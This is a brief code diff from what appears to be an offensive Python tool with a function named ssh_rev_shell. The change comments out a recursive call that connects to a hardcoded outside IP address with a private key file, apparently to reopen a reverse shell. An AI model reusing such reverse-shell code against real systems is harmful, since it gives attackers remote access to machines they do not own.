@@ -133,10 +133,10 @@ def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
                 print("[!] Response sent!")
 
                 # Make a recursive call
-                try:
-                    ssh_rev_shell('34.204.78.186', 'ubuntu', './archenemy_rsa', user, 64000)
-                except Exception as e:
-                    pass
+                #try:
+                #    ssh_rev_shell('34.204.78.186', 'ubuntu', './archenemy_rsa', user, 64000)
+                #except Exception as e:
+                #    pass
 
                 return
 
